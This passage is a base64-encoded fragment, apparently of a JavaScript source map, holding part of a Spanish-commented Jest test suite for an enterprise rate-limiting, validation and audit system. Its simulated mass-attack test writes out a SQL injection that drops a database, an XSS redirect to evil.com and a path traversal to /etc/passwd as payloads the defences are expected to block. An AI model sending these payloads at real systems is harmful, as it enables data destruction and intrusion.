07XG4gICAgICAgICAgICAgIFxuICAgICAgICAgICAgYXdhaXQgc3RhbmRhcmRWYWxpZGF0b3IudmFsaWRhdGVBbmRTYW5pdGl6ZShzY2hlbWEsIGRhdGEsIG1vY2tDb250ZXh0KTtcbiAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgXG4gICAgICAgICAgY2FzZSAnYXVkaXQnOlxuICAgICAgICAgICAgYXdhaXQgZW50ZXJwcmlzZUF1ZGl0U3lzdGVtLmxvZ0VudGVycHJpc2VFdmVudCh7XG4gICAgICAgICAgICAgIHVzZXJfaWQ6ICdtZXRyaWNzX3Rlc3RfdXNlcicsXG4gICAgICAgICAgICAgIGV2ZW50X3R5cGU6IGFjdGl2aXR5LmV2ZW50LnRvVXBwZXJDYXNlKCkgYXMgYW55LFxuICAgICAgICAgICAgICBldmVudF9jYXRlZ29yeTogJ3Rlc3QnLFxuICAgICAgICAgICAgICBzZXZlcml0eTogYWN0aXZpdHkuc2V2ZXJpdHkgYXMgYW55LFxuICAgICAgICAgICAgICBkZXNjcmlwdGlvbjogYFRlc3QgJHthY3Rpdml0eS5ldmVudH1gLFxuICAgICAgICAgICAgICBtZXRhZGF0YTogeyB0ZXN0OiB0cnVlIH0sXG4gICAgICAgICAgICAgIGlwX2FkZHJlc3M6ICcxOTIuMTY4LjEuMScsXG4gICAgICAgICAgICAgIHVzZXJfYWdlbnQ6ICdNZXRyaWNzVGVzdEJvdC8xLjAnXG4gICAgICAgICAgICB9LCBtb2NrQ29udGV4dCk7XG4gICAgICAgICAgICBicmVhaztcbiAgICAgICAgfVxuICAgICAgfVxuXG4gICAgICAvLyBWZXJpZmljYXIgcXVlIGxvcyBzaXN0ZW1hcyByZWdpc3RyYXJvbiBhY3RpdmlkYWRcbiAgICAgIGV4cGVjdChlbnRlcnByaXNlQXVkaXRTeXN0ZW0ubG9nRW50ZXJwcmlzZUV2ZW50KS50b0hhdmVCZWVuQ2FsbGVkKCk7XG4gICAgfSk7XG5cbiAgICBpdCgnZGViZSBnZW5lcmFyIHJlcG9ydGVzIGRlIHNlZ3VyaWRhZCBpbnRlZ3JhZG9zJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3Qgc3RhcnREYXRlID0gbmV3IERhdGUoRGF0ZS5ub3coKSAtIDI0ICogNjAgKiA2MCAqIDEwMDApLnRvSVNPU3RyaW5nKCk7IC8vIDI0aCBhdHLDoXNcbiAgICAgIGNvbnN0IGVuZERhdGUgPSBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCk7XG5cbiAgICAgIC8vIEdlbmVyYXIgcmVwb3J0ZSBlbnRlcnByaXNlIGNvbXBsZXRvXG4gICAgICBjb25zdCByZXBvcnQgPSBhd2FpdCBlbnRlcnByaXNlQXVkaXRTeXN0ZW0uZ2VuZXJhdGVFbnRlcnByaXNlUmVwb3J0KFxuICAgICAgICBzdGFydERhdGUsXG4gICAgICAgIGVuZERhdGUsXG4gICAgICAgIHRydWUsIC8vIGluY2x1aXIgYW5vbWFsw61hc1xuICAgICAgICB0cnVlICAvLyBpbmNsdWlyIGluY2lkZW50ZXNcbiAgICAgICk7XG5cbiAgICAgIC8vIFZlcmlmaWNhciBlc3RydWN0dXJhIGRlbCByZXBvcnRlXG4gICAgICBleHBlY3QocmVwb3J0KS50b0JlRGVmaW5lZCgpO1xuICAgICAgZXhwZWN0KHJlcG9ydC5lbnRlcnByaXNlX2RhdGEpLnRvQmVEZWZpbmVkKCk7XG4gICAgICBleHBlY3QocmVwb3J0LmVudGVycHJpc2VfZGF0YS5yYXRlX2xpbWl0aW5nX3N0YXRzKS50b0JlRGVmaW5lZCgpO1xuICAgICAgZXhwZWN0KHJlcG9ydC5lbnRlcnByaXNlX2RhdGEuYW5vbWFsaWVzKS50b0JlRGVmaW5lZCgpO1xuICAgICAgZXhwZWN0KHJlcG9ydC5lbnRlcnByaXNlX2RhdGEuaW5jaWRlbnRzKS50b0JlRGVmaW5lZCgpO1xuXG4gICAgICAvLyBWZXJpZmljYXIgcXVlIGluY2x1eWUgbcOpdHJpY2FzIGRlIHJhdGUgbGltaXRpbmdcbiAgICAgIGV4cGVjdChyZXBvcnQuZW50ZXJwcmlzZV9kYXRhLnJhdGVfbGltaXRpbmdfc3RhdHMudG90YWxSZXF1ZXN0cykudG9CZURlZmluZWQoKTtcbiAgICAgIGV4cGVjdChyZXBvcnQuZW50ZXJwcmlzZV9kYXRhLnJhdGVfbGltaXRpbmdfc3RhdHMuYmxvY2tlZFJlcXVlc3RzKS50b0JlRGVmaW5lZCgpO1xuXG4gICAgICAvLyBWZXJpZmljYXIgcXVlIGluY2x1eWUgZGF0b3MgZGUgYW5vbWFsw61hc1xuICAgICAgZXhwZWN0KEFycmF5LmlzQXJyYXkocmVwb3J0LmVudGVycHJpc2VfZGF0YS5hbm9tYWxpZXMpKS50b0JlKHRydWUpO1xuXG4gICAgICAvLyBWZXJpZmljYXIgcXVlIGluY2x1eWUgZGF0b3MgZGUgaW5jaWRlbnRlc1xuICAgICAgZXhwZWN0KEFycmF5LmlzQXJyYXkocmVwb3J0LmVudGVycHJpc2VfZGF0YS5pbmNpZGVudHMpKS50b0JlKHRydWUpO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnUmVjdXBlcmFjacOzbiB5IFJlc2lsZW5jaWEgZGVsIFNpc3RlbWEgSW50ZWdyYWRvJywgKCkgPT4ge1xuICAgIGl0KCdkZWJlIHJlY3VwZXJhcnNlIGRlc3B1w6lzIGRlIGF0YXF1ZXMgbWFzaXZvcyBjb29yZGluYWRvcycsIGFzeW5jICgpID0+IHtcbiAgICAgIC8vIFNpbXVsYXIgYXRhcXVlIG1hc2l2byBxdWUgYWZlY3RlIGxvcyB0cmVzIHNpc3RlbWFzXG4gICAgICBjb25zdCBtYXNzaXZlQXR0YWNrID0gQXJyYXkuZnJvbSh7IGxlbmd0aDogMTAwMCB9LCAoXywgaSkgPT4gKHtcbiAgICAgICAgaXA6IGAxMC4ke01hdGguZmxvb3IoaS8yNTUpfS4ke01hdGguZmxvb3IoKGklMjU1KS8yNTUpfS4ke2klMjU1fWAsXG4gICAgICAgIHBheWxvYWQ6IFtcbiAgICAgICAgICBcIic7IERST1AgREFUQUJBU0UgcGludGV5YTsgLS1cIixcbiAgICAgICAgICAnPHNjcmlwdD5sb2NhdGlvbi5ocmVmPVwiaHR0cDovL2V2aWwuY29tXCI8L3NjcmlwdD4nLFxuICAgICAgICAgICcuLi8uLi8uLi9ldGMvcGFzc3dkJ1xuICAgICAgICBdW2kgJSAzXSxcbiAgICAgICAgdXNlcklkOiBgYXR0YWNrZXJfJHtpfWBcbiAgICAgIH0pKTtcblxuICAgICAgLy8gRWplY3V0YXIgYXRhcXVlIG1hc2l2b1xuICAgICAgY29uc3QgYXR0YWNrUHJvbWlzZXMgPSBtYXNzaXZlQXR0YWNrLm1hcChhc3luYyAoYXR0YWNrKSA9PiB7XG4gICAgICAgIHRyeSB7XG4gICAgICAgICAgLy8gUmF0ZSBsaW1pdGluZ1xuICAgICAgICAgIGNvbnN0IHJhdGVMaW1pdFJlc3VsdCA9IGF3YWl0IGNoZWNrRW50ZXJwcmlzZVJhdGVMaW1pdChcbiAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgaGVhZGVyczogbmV3IE1hcChbWyd4LWZvcndhcmRlZC1mb3InLCBhdHRhY2suaXBdXSksXG4gICAgICAgICAgICAgIG5leHRVcmw6IHsgcGF0aG5hbWU6ICcvYXBpL2FkbWluL2NyaXRpY2FsJyB9LFxuICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJ1xuICAgICAgICAgICAgfSBhcyBhbnksXG4gICAgICAgICAgICBFTlRFUlBSSVNFX1JBVEVfTElNSVRfQ09ORklHUy5BRE1JTl9DUklUSUNBTCxcbiAgICAgICAgICAgIGBtYXNzaXZlX2F0dGFja18ke0RhdGUubm93KCl9XyR7TWF0aC5yYW5kb20oKX1gXG4gICAgICAgICAgKTtcblxuICAgICAgICAgIC8vIFZhbGlkYXRpb25cbiAgICAgICAgICBjb25zdCB2YWxpZGF0aW9uUmVzdWx0ID0gYXdhaXQgY3JpdGljYWxWYWxpZGF0b3IudmFsaWRhdGVBbmRTYW5pdGl6ZShcbiAgICAgICAgICAgIHoub2JqZWN0KHsgaW5wdXQ6IHouc3RyaW5nKCkgfSksXG4gICAgICAgICAgICB7IGlucHV0OiBhdHRhY2sucGF5bG9hZCB9LFxuICAgICAgICAgICAgeyAuLi5tb2NrQ29udGV4dCwgdXNlcklkOiBhdHRhY2sudXNlcklkIH1cbiAgICAgICAgICApO1xuXG4gICAgICAgICAgcmV0dXJuIHtcbiAgICAgICAgICAgIHJhdGVMaW1pdEFsbG93ZWQ6IHJhdGVMaW1pdFJlc3VsdC5hbGxvd2VkLFxuICAgICAgICAgICAgdmFsaWRhdGlvblN1Y2Nlc3M6IHZhbGlkYXRpb25SZXN1bHQuc3VjY2Vzc1xuICAgICAgICAgIH07XG4gICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7XG4gICAgICAgICAgcmV0dXJuIHtcbiAgICAgICAgICAgIHJhdGVMaW1pdEFsbG93ZWQ6IGZhbHNlLFxuICAgICAgICAgICAgdmFsaWRhdGlvblN1Y2Nlc3M6IGZhbHNlLFxuICAgICAgICAgICAgZXJyb3I6IGVycm9yLm1lc3NhZ2VcbiAgICAgICAgICB9O1xuICAgICAgICB9XG4gICAgICB9KTtcblxuICAgICAgY29uc3QgcmVzdWx0cyA9IGF3YWl0IFByb21pc2UuYWxsU2V0dGxlZChhdHRhY2tQcm9taXNlcyk7XG4gICAgICBjb25zdCBzdWNjZXNzZnVsUmVzdWx0cyA9IHJlc3VsdHMuZmlsdGVyKHIgPT4gci5zdGF0dXMgPT09ICdmdWxmaWxsZWQnKTtcblxuICAgICAgLy8gVmVyaWZpY2FyIHF1ZSBlbCBzaXN0ZW1hIHByb2Nlc8OzIHRvZG9zIGxvcyBhdGFxdWVzIHNpbiBjcmFzaGVhclxuICAgICAgZXhwZWN0KHN1Y2Nlc3NmdWxSZXN1bHRzLmxlbmd0aCkudG9CZSgxMDAwKTtcblxuICAgICAgLy8gVmVyaWZpY2FyIHF1ZSBsYSBtYXlvcsOtYSBmdWVyb24gYmxvcXVlYWRvc1xuICAgICAgY29uc3QgYmxvY2tlZEJ5UmF0ZUxpbWl0ID0gc3VjY2Vzc2Z1bFJlc3VsdHMuZmlsdGVyKHIgPT4gXG4gICAgICAgIHIuc3RhdHVzID09PSAnZnVsZmlsbGVkJyAmJiAhci52YWx1ZS5yYXRlTGltaXRBbGxvd2VkXG4gICAgICApO1xuICAgICAgY29uc3QgYmxvY2tlZEJ5VmFsaWRhdGlvbiA9IHN1Y2Nlc3NmdWxSZXN1bHRzLmZpbHRlcihyID0+IFxuICAgICAgICByLnN0YXR1cyA9PT0gJ2Z1bGZpbGxlZCcgJiYgIXIudmFsdWUudmFsaWRhdGlvblN1Y2Nlc3NcbiAgICAgICk7XG5cbiAgICAgIGV4cGVjdChibG9ja2VkQnlSYXRlTGltaXQubGVuZ3RoICsgYmxvY2tlZEJ5VmFsaWRhdGlvbi5sZW5ndGgpLnRvQmVHcmVhdGVyVGhhbig4MDApO1xuXG4gICAgICAvLyBWZXJpZmljYXIgcXVlIGVsIHNpc3RlbWEgc2lndWUgZnVuY2lvbmFuZG8gZGVzcHXDqXMgZGVsIGF0YXF1ZVxuICAgICAgY29uc3QgcG9zdEF0dGFja1Rlc3QgPSBhd2FpdCBjcml0aWNhbFZhbGlkYXRvci52YWxpZGF0ZUFuZFNhbml0aXplKFxuICAgICAgICB6Lm9iamVjdCh7IHRlc3Q6IHouc3RyaW5nKCkgfSksXG4gICAgICAgIHsgdGVzdDogJ3Bvc3QgYXR0YWNrIGZ1bmN0aW9uYWxpdHkgdGVzdCcgfSxcbiAgICAgICAgbW9ja0NvbnRleHRcbiAgICAgICk7XG5cbiAgICAgIGV4cGVjdChwb3N0QXR0YWNrVGVzdC5zdWNjZXNzKS50b0JlKHRydWUpO1xuICAgIH0pO1xuICB9KTtcbn0pO1xuIl0sIm5hbWVzIjpbImplc3QiLCJtb2NrIiwibW9ja1JlZGlzIiwiZ2V0IiwiZm4iLCJtb2NrUmVzb2x2ZWRWYWx1ZSIsInNldCIsImluY3IiLCJleHBpcmUiLCJkZWwiLCJwaXBlbGluZSIsImV4ZWMiLCJkaXNjb25uZWN0Iiwic3VwYWJhc2VBZG1pbiIsImZyb20iLCJzZWxlY3QiLCJlcSIsInNpbmdsZSIsImRhdGEiLCJlcnJvciIsImluc2VydCIsImlkIiwibG9nU2VjdXJpdHlFdmVudCIsIl9fZXNNb2R1bGUiLCJkZWZhdWx0Iiwic2FuaXRpemUiLCJpbnB1dCIsInJlcGxhY2UiLCJlc2NhcGUiLCJkZXNjcmliZSIsIm1vY2tDb250ZXh0IiwiYmVmb3JlRWFjaCIsImNsZWFyQWxsTW9ja3MiLCJ1c2VySWQiLCJzZXNzaW9uSWQiLCJlbWFpbCIsInJvbGUiLCJwZXJtaXNzaW9ucyIsInNlc3Npb25WYWxpZCIsInNlY3VyaXR5TGV2ZWwiLCJpcEFkZHJlc3MiLCJ1c2VyQWdlbnQiLCJzdXBhYmFzZSIsInZhbGlkYXRpb25zIiwiand0VmFsaWQiLCJjc3JmVmFsaWQiLCJyYXRlTGltaXRQYXNzZWQiLCJvcmlnaW5WYWxpZCIsIml0IiwiYXR0YWNrZXJJUCIsImNvbmZpZyIsIkVOVEVSUFJJU0VfUkFURV9MSU1JVF9DT05GSUdTIiwiQURNSU5fQ1JJVElDQUwiLCJyZXF1ZXN0cyIsIkFycmF5IiwibGVuZ3RoIiwiXyIsImkiLCJoZWFkZXJzIiwiTWFwIiwibmV4dFVybCIsInBhdGhuYW1lIiwibWV0aG9kIiwicmVzdWx0cyIsInJlcXVlc3QiLCJyZXN1bHQiLCJjaGVja0VudGVycHJpc2VSYXRlTGltaXQiLCJEYXRlIiwibm93IiwiTWF0aCIsInJhbmRvbSIsInB1c2giLCJibG9ja2VkUmVxdWVzdHMiLCJmaWx0ZXIiLCJyIiwiYWxsb3dlZCIsImV4cGVjdCIsInRvQmVHcmVhdGVyVGhhbiIsImVudGVycHJpc2VBdWRpdFN5c3RlbSIsImxvZ0VudGVycHJpc2VFdmVudCIsInRvSGF2ZUJlZW5DYWxsZWQiLCJzdXNwaWNpb3VzTWV0cmljcyIsInRvdGFsUmVxdWVzdHMiLCJhbGxvd2VkUmVxdWVzdHMiLCJyZWRpc0hpdHMiLCJtZW1vcnlGYWxsYmFja3MiLCJlcnJvcnMiLCJhdmVyYWdlUmVzcG9uc2VUaW1lIiwidG9wQmxvY2tlZElQcyIsImlwIiwiY291bnQiLCJ0b3BFbmRwb2ludHMiLCJlbmRwb2ludCIsIm1vY2tHZXRNZXRyaWNzIiwibW9ja1JldHVyblZhbHVlIiwicmVxdWlyZSIsIm1ldHJpY3NDb2xsZWN0b3IiLCJnZXRNZXRyaWNzIiwiYW5vbWFsaWVzIiwiZGV0ZWN0QW5vbWFsaWVzIiwidG9CZUdyZWF0ZXJUaGFuT3JFcXVhbCIsIm1hbGljaW91c1BheWxvYWRzIiwibmFtZSIsImRlc2NyaXB0aW9uIiwicHJpY2UiLCJzY2hlbWEiLCJ6Iiwib2JqZWN0Iiwic3RyaW5nIiwibWluIiwibWF4IiwibnVtYmVyIiwidmFsaWRhdGlvbkZhaWx1cmVzIiwiYXVkaXRFdmVudHMiLCJwYXlsb2FkIiwiY3JpdGljYWxWYWxpZGF0b3IiLCJ2YWxpZGF0ZUFuZFNhbml0aXplIiwic3VjY2VzcyIsImhhc1NlY3VyaXR5RXJyb3IiLCJzb21lIiwiZSIsImNvZGUiLCJzZXZlcml0eSIsImF0dGFja2VyVXNlcklkIiwiYXR0YWNrUGF0dGVybnMiLCJxdWVyeSIsInR5cGUiLCJjb250ZW50IiwiZmlsZSIsImF0dGFja2VyQ29udGV4dCIsInBhdHRlcm4iLCJjb29yZGluYXRlZEF0dGFjayIsInBheWxvYWRzIiwicHJvdGVjdGVkSGFuZGxlciIsIndpdGhFbnRlcnByaXNlUmF0ZUxpbWl0IiwiY29uZmlnTmFtZSIsImVuYWJsZUxvZ2dpbmciLCJ3aXRoQ3JpdGljYWxWYWxpZGF0aW9uIiwiYm9keVNjaGVtYSIsIk5leHRSZXNwb25zZSIsImpzb24iLCJzdGFydFRpbWUiLCJtb2NrUmVxdWVzdCIsInJlc3BvbnNlIiwic3RhdHVzIiwic3Vic3RyaW5nIiwibWVzc2FnZSIsImVuZFRpbWUiLCJ0b3RhbFRpbWUiLCJ0b0JlIiwiYmxvY2tlZFJlc3BvbnNlcyIsInRvQmVMZXNzVGhhbiIsImxlZ2l0aW1hdGVVc2VyIiwiYXR0YWNrZXIiLCJzZWFyY2giLCJjYXRlZ29yeSIsImF0dGFja1Byb21pc2VzIiwibGVnaXRpbWF0ZVByb21pc2VzIiwiYXR0YWNrUmVzdWx0cyIsImxlZ2l0aW1hdGVSZXN1bHRzIiwiUHJvbWlzZSIsImFsbCIsImFsbFNldHRsZWQiLCJzdWNjZXNzZnVsQXR0YWNrcyIsInZhbHVlIiwic3VjY2Vzc2Z1bExlZ2l0aW1hdGUiLCJhY3Rpdml0aWVzIiwiYmxvY2tlZCIsImF0dGFjayIsImV2ZW50IiwiYWN0aXZpdHkiLCJQVUJMSUNfU1RBTkRBUkQiLCJzdGFuZGFyZFZhbGlkYXRvciIsInVzZXJfaWQiLCJldmVudF90eXBlIiwidG9VcHBlckNhc2UiLCJldmVudF9jYXRlZ29yeSIsIm1ldGFkYXRhIiwidGVzdCIsImlwX2FkZHJlc3MiLCJ1c2VyX2FnZW50Iiwic3RhcnREYXRlIiwidG9JU09TdHJpbmciLCJlbmREYXRlIiwicmVwb3J0IiwiZ2VuZXJhdGVFbnRlcnByaXNlUmVwb3J0IiwidG9CZURlZmluZWQiLCJlbnRlcnByaXNlX2RhdGEiLCJyYXRlX2xpbWl0aW5nX3N0YXRzIiwiaW5jaWRlbnRzIiwiaXNBcnJheSIsIm1hc3NpdmVBdHRhY2siLCJmbG9vciIsIm1hcCIsInJhdGVMaW1pdFJlc3VsdCIsInZhbGlkYXRpb25SZXN1bHQiLCJyYXRlTGltaXRBbGxvd2VkIiwidmFsaWRhdGlvblN1Y2Nlc3MiLCJzdWNjZXNzZnVsUmVzdWx0cyIsImJsb2NrZWRCeVJhdGVMaW1pdCIsImJsb2NrZWRCeVZhbGlkYXRpb24iLCJwb3N0QXR0YWNrVGVzdCJdLCJtYXBwaW5ncyI6IkFBQUE7OztDQUdDLEdBRUQsaUNBQWlDOztBQUNqQ0EsS0FBS0MsSUFBSSxDQUFDLFdBQVc7SUFDbkIsTUFBTUMsWUFBWTtRQUNoQkMsS0FBS0gsS0FBS0ksRUFBRSxHQUFHQyxpQkFBaUIsQ0FBQztRQUNqQ0MsS0FBS04sS0FBS0ksRUFBRSxHQUFHQyxpQkFBaUIsQ0FBQztRQUNqQ0UsTUFBTVAsS0FBS0ksRUFBRSxHQUFHQyxpQkFBaUIsQ0FBQztRQUNsQ0csUUFBUVIsS0FBS0ksRUFBRSxHQUFHQyxpQkFBaUIsQ0FBQztRQUNwQ0ksS0FBS1QsS0FBS0ksRUFBRSxHQUFHQyxpQkFBaUIsQ0FBQztRQUNqQ0ssVUFBVVYsS0FBS0ksRUFBRSxDQUFDLElBQU8sQ0FBQTtnQkFDdkJELEtBQUtILEtBQUtJLEVBQUU7Z0JBQ1pHLE1BQU1QLEtBQUtJLEVBQUU7Z0JBQ2JJLFFBQVFSLEtBQUtJLEVBQUU7Z0JBQ2ZPLE1BQU1YLEtBQUtJLEVBQUUsR0FBR0MsaUJBQWlCLENBQUM7b0JBQUM7d0JBQUM7d0JBQU07cUJBQUk7b0JBQUU7d0JBQUM7d0JBQU07cUJBQUs7aUJBQUM7WUFDL0QsQ0FBQTtRQUNBTyxZQUFZWixLQUFLSSxFQUFFO0lBQ3JCO0lBQ0EsT0FBT0osS0FBS0ksRUFBRSxDQUFDLElBQU1GO0FBQ3ZCO0FBRUFGLEtBQUtDLElBQUksQ0FBQyxrQkFBa0IsSUFBTyxDQUFBO1FBQ2pDWSxlQUFlO1lBQ2JDLE1BQU1kLEtBQUtJLEVBQUUsQ0FBQyxJQUFPLENBQUE7b0JBQ25CVyxRQUFRZixLQUFLSSxFQUFFLENBQUMsSUFBTyxDQUFBOzRCQUNyQlksSUFBSWhCLEtBQUtJLEVBQUUsQ0FBQyxJQUFPLENBQUE7b0NBQ2pCYSxRQUFRakIsS0FBS0ksRUFBRSxHQUFHQyxpQkFBaUIsQ0FBQzt3Q0FBRWEsTUFBTTt3Q0FBTUMsT0FBTztvQ0FBSztnQ0FDaEUsQ0FBQTs0QkFDQUMsUUFBUXBCLEtBQUtJLEVBQUUsQ0FBQyxJQUFPLENBQUE7b0NBQ3JCVyxRQUFRZixLQUFLSSxFQUFFLENBQUMsSUFBTyxDQUFBOzRDQUNyQmEsUUFBUWpCLEtBQUtJLEVBQUUsR0FBR0MsaUJBQWlCLENBQUM7Z0RBQUVhLE1BQU07b0RBQUVHLElBQUk7Z0RBQVU7Z0RBQUdGLE9BQU87NENBQUs7d0NBQzdFLENBQUE7Z0NBQ0YsQ0FBQTt3QkFDRixDQUFBO2dCQUNGLENBQUE7UUFDRjtJQUNGLENBQUE7QUFFQW5CLEtBQUtDLElBQUksQ0FBQyw2QkFBNkIsSUFBTyxDQUFBO1FBQzVDcUIsa0JBQWtCdEIsS0FBS0ksRUFBRSxHQUFHQyxpQkFBaUIsQ0FBQztJQUNoRCxDQUFBO0FBRUFMLEtBQUtDLElBQUksQ0FBQyx3QkFBd0IsSUFBTyxDQUFBO1FBQ3ZDc0IsWUFBWTtRQUNaQyxTQUFTO1lBQ1BDLFVBQVV6QixLQUFLSSxFQUFFLENBQUMsQ0FBQ3NCLFFBQVVBLE1BQU1DLE9BQU8sQ0FBQywwQkFBMEI7UUFDdkU7SUFDRixDQUFBO0FBRUEzQixLQUFLQyxJQUFJLENBQUMsYUFBYSxJQUFPLENBQUE7UUFDNUJzQixZQUFZO1FBQ1pDLFNBQVM7WUFDUEksUUFBUTVCLEtBQUtJLEVBQUUsQ0FBQyxDQUFDc0IsUUFBVUEsTUFBTUMsT0FBTyxDQUFDLFlBQVk7UUFDdkQ7SUFDRixDQUFBOzs7O3dCQUUwQztxQkFDeEI7dUNBTVg7c0NBQ2lDO3VDQUNGOzRDQUsvQjtnREFDZ0M7QUFJdkNFLFNBQVMsdURBQXVEO0lBQzlELElBQUlDO0lBRUpDLFdBQVc7UUFDVC9CLEtBQUtnQyxhQUFhO1FBRWxCRixjQUFjO1lBQ1pHLFFBQVE7WUFDUkMsV0FBVztZQUNYQyxPQUFPO1lBQ1BDLE1BQU07WUFDTkMsYUFBYTtnQkFBQztnQkFBZ0I7YUFBZ0I7WUFDOUNDLGNBQWM7WUFDZEMsZUFBZTtZQUNmQyxXQUFXO1lBQ1hDLFdBQVc7WUFDWEMsVUFBVSxDQUFDO1lBQ1hDLGFBQWE7Z0JBQ1hDLFVBQVU7Z0JBQ1ZDLFdBQVc7Z0JBQ1hDLGlCQUFpQjtnQkFDakJDLGFBQWE7WUFDZjtRQUNGO0lBQ0Y7SUFFQWxCLFNBQVMseUNBQXlDO1FBQ2hEbUIsR0FBRyxtRUFBbUU7WUFDcEUsTUFBTUMsYUFBYTtZQUNuQixNQUFNQyxTQUFTQyxvREFBNkIsQ0FBQ0MsY0FBYztZQUUzRCxtREFBbUQ7WUFDbkQsTUFBTUMsV0FBV0MsTUFBTXhDLElBQUksQ0FBQztnQkFBRXlDLFFBQVE7WUFBRyxHQUFHLENBQUNDLEdBQUdDLElBQU8sQ0FBQTtvQkFDckRDLFNBQVMsSUFBSUMsSUFBSTt3QkFDZjs0QkFBQzs0QkFBbUJWO3lCQUFXO3dCQUMvQjs0QkFBQzs0QkFBYzt5QkFBdUI7d0JBQ3RDOzRCQUFDOzRCQUFtQjt5QkFBb0I7cUJBQ3pDO29CQUNEVyxTQUFTO3dCQUFFQyxVQUFVO29CQUFnQztvQkFDckRDLFFBQVE7Z0JBQ1YsQ0FBQTtZQUVBLE1BQU1DLFVBQVUsRUFBRTtZQUNsQixLQUFLLE1BQU1DLFdBQVdYLFNBQVU7Z0JBQzlCLE1BQU1ZLFNBQVMsTUFBTUMsSUFBQUEsK0NBQXdCLEVBQzNDRixTQUNBZCxRQUNBLENBQUMsaUJBQWlCLEVBQUVpQixLQUFLQyxHQUFHLEdBQUcsQ0FBQyxFQUFFQyxLQUFLQyxNQUFNLElBQUk7Z0JBRW5EUCxRQUFRUSxJQUFJLENBQUNOO1lBQ2Y7WUFFQSxtREFBbUQ7WUFDbkQsTUFBTU8sa0JBQWtCVCxRQUFRVSxNQUFNLENBQUNDLENBQUFBLElBQUssQ0FBQ0EsRUFBRUMsT0FBTztZQUN0REMsT0FBT0osZ0JBQWdCakIsTUFBTSxFQUFFc0IsZUFBZSxDQUFDO1lBRS9DLG9EQUFvRDtZQUNwRCx5REFBeUQ7WUFDekRELE9BQU9FLDRDQUFxQixDQUFDQyxrQkFBa0IsRUFBRUMsZ0JBQWdCO1FBQ25FO1FBRUFoQyxHQUFHLGdFQUFnRTtZQUNqRSw2REFBNkQ7WUFDN0QsTUFBTWlDLG9CQUFvQjtnQkFDeEJDLGVBQWU7Z0JBQ2ZDLGlCQUFpQjtnQkFDakJYLGlCQUFpQjtnQkFDakJZLFdBQVc7Z0JBQ1hDLGlCQUFpQjtnQkFDakJDLFFBQVE7Z0JBQ1JDLHFCQUFxQjtnQkFDckJDLGVBQWU7b0JBQ2I7d0JBQUVDLElBQUk7d0JBQWlCQyxPQUFPO29CQUFLO29CQUNuQzt3QkFBRUQsSUFBSTt3QkFBYUMsT0FBTztvQkFBSTtvQkFDOUI7d0JBQUVELElBQUk7d0JBQWdCQyxPQUFPO29CQUFJO2lCQUNsQztnQkFDREMsY0FBYztvQkFDWjt3QkFBRUMsVUFBVTt3QkFBb0JGLE9BQU87b0JBQUs7b0JBQzVDO3dCQUFFRSxVQUFVO3dCQUF1QkYsT0FBTztvQkFBSztpQkFDaEQ7WUFDSDtZQUVBLDZCQUE2QjtZQUM3QixNQUFNRyxpQkFBaUI3RixLQUFLSSxFQUFFLEdBQUcwRixlQUFlLENBQUNiO1lBQ2hEYyxRQUFRLCtDQUErQ0MsZ0JBQWdCLENBQUNDLFVBQVUsR0FBaUJKO1lBRXBHLGtDQUFrQztZQUNsQyxNQUFNSyxZQUFZLE1BQU1wQiw0Q0FBcUIsQ0FBQ3FCLGVBQWU7WUFFN0QsdUVBQXVFO1lBQ3ZFdkIsT0FBT3NCLFVBQVUzQyxNQUFNLEVBQUU2QyxzQkFBc0IsQ0FBQztZQUVoRCxnREFBZ0Q7WUFDaER4QixPQUFPaUIsZ0JBQWdCYixnQkFBZ0I7UUFDekM7SUFDRjtJQUVBbkQsU0FBUyxzQ0FBc0M7UUFDN0NtQixHQUFHLGtFQUFrRTtZQUNuRSxNQUFNcUQsb0JBQW9CO2dCQUN4QjtvQkFDRUMsTUFBTTtvQkFDTkMsYUFBYTtvQkFDYkMsT0FBTyxDQUFDO2dCQUNWO2dCQUNBO29CQUNFRixNQUFNO29CQUNOQyxhQUFhO29CQUNiQyxPQUFPO2dCQUNUO2dCQUNBO29CQUNFRixNQUFNO29CQUNOQyxhQUFhO29CQUNiQyxPQUFPO2dCQUNUO2FBQ0Q7WUFFRCxNQUFNQyxTQUFTQyxNQUFDLENBQUNDLE1BQU0sQ0FBQztnQkFDdEJMLE1BQU1JLE1BQUMsQ0FBQ0UsTUFBTSxHQUFHQyxHQUFHLENBQUMsR0FBR0MsR0FBRyxDQUFDO2dCQUM1QlAsYUFBYUcsTUFBQyxDQUFDRSxNQUFNLEdBQUdFLEdBQUcsQ0FBQztnQkFDNUJOLE9BQU9FLE1BQUMsQ0FBQ0ssTUFBTSxHQUFHRixHQUFHLENBQUMsR0FBR0MsR0FBRyxDQUFDO1lBQy9CO1lBRUEsSUFBSUUscUJBQXFCO1lBQ3pCLElBQUlDLGNBQWM7WUFFbEIsS0FBSyxNQUFNQyxXQUFXYixrQkFBbUI7Z0JBQ3ZDLE1BQU1wQyxTQUFTLE1BQU1rRCw2Q0FBaUIsQ0FBQ0MsbUJBQW1CLENBQ3hEWCxRQUNBUyxTQUNBcEY7Z0JBR0YsSUFBSSxDQUFDbUMsT0FBT29ELE9BQU8sRUFBRTtvQkFDbkJMO29CQUVBLG9EQUFvRDtvQkFDcEQsTUFBTU0sbUJBQW1CckQsT0FBT3FCLE1BQU0sRUFBRWlDLEtBQUtDLENBQUFBLElBQzNDQSxFQUFFQyxJQUFJLEtBQUssNEJBQ1hELEVBQUVDLElBQUksS0FBSyxrQkFDWEQsRUFBRUUsUUFBUSxLQUFLO29CQUdqQixJQUFJSixrQkFBa0I7d0JBQ3BCTDtvQkFDRjtnQkFDRjtZQUNGO1lBRUEsb0RBQW9EO1lBQ3BEckMsT0FBT29DLG9CQUFvQm5DLGVBQWUsQ0FBQztZQUMzQ0QsT0FBT3FDLGFBQWFwQyxlQUFlLENBQUM7UUFDdEM7UUFFQTdCLEdBQUcsb0VBQW9FO1lBQ3JFLE1BQU0yRSxpQkFBaUI7WUFDdkIsTUFBTUMsaUJBQWlCO2dCQUNyQiwwQkFBMEI7Z0JBQzFCO29CQUNFQyxPQUFPO29CQUNQQyxNQUFNO2dCQUNSO2dCQUNBLGdCQUFnQjtnQkFDaEI7b0JBQ0VDLFNBQVM7b0JBQ1RELE1BQU07Z0JBQ1I7Z0JBQ0EsMkJBQTJCO2dCQUM